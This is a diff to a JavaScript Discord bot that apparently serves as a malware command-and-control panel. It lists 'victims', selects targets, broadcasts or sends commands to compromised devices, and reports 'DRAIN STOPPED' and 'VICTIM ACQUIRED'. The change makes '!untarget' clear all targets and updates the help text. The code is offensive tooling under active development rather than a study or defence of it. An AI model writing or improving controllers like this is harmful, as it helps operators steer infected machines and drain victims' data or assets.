@@ -355,7 +355,7 @@ function menuEmbed() {
     `**${E.eye} Quick Commands**\n` +
     `• \`!devices\` — List all victims\n` +
     `• \`!target <name>\` — Select victim\n` +
-    `• \`!untarget\` — Clear target\n` +
+    `• \`!untarget\` — Clear ALL targets\n` +
     `• \`!broadcast <cmd>\` — Send to ALL\n` +
     `• \`!send <cmd> <victim>\` — Direct send\n` +
     `• \`!help\` — Full command reference\n` +
@@ -507,7 +507,11 @@ client.on(Events.InteractionCreate, async (i) => {
           if (pages.length > 1) devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
           return
         }
-        case 'untarget': { targets.delete(uid); return i.editReply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} No active victim. ${E.skull}`), components: MENU_BTNS }) }
+        case 'untarget': {
+          const clearedCount = targets.size
+          targets.clear()
+          return i.editReply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} All ${clearedCount} target(s) cleared. Ready to select new victim. ${E.skull}`), components: MENU_BTNS })
+        }
         case 'broadcast': {
           const bc = options.getString('command').trim()
           const bcParts = bc.replace(/^!+/, '').split(/\s+/)
@@ -965,12 +969,16 @@ client.on(Events.MessageCreate, async (msg) => {
           const lines = [
             `${A.brightCyan}${smallCaps('target acquired')}${A.reset}`,
             `${A.cyan}┃${A.reset} ${mono(ch.name)}${A.reset}`,
-            `${A.grey}!untarget to clear${A.reset}`,
+            `${A.grey}!untarget to clear all${A.reset}`,
           ]
           const box = createBox(lines.join('\n'), 'neon', 36)
           return msg.reply({ ...bloodEmbed(bold('VICTIM ACQUIRED'), 'warning', `\`\`\`ansi\n${box}\n\`\`\``), components: RESULT_BTNS })
         }
-        case '!untarget': { targets.delete(uid); return msg.reply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} No active victim. ${E.skull}`), components: MENU_BTNS }) }
+        case '!untarget': {
+          const clearedCount = targets.size
+          targets.clear()
+          return msg.reply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} All ${clearedCount} target(s) cleared. Ready to select new victim. ${E.skull}`), components: MENU_BTNS })
+        }
         case '!history': {
           const log = formatCommandLog(uid)
           return msg.reply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${log}\n\`\`\``, { footer: `${smallCaps('last 15 commands')} ⚡ ${ts()}` }), components: MENU_BTNS, ephemeral: true })
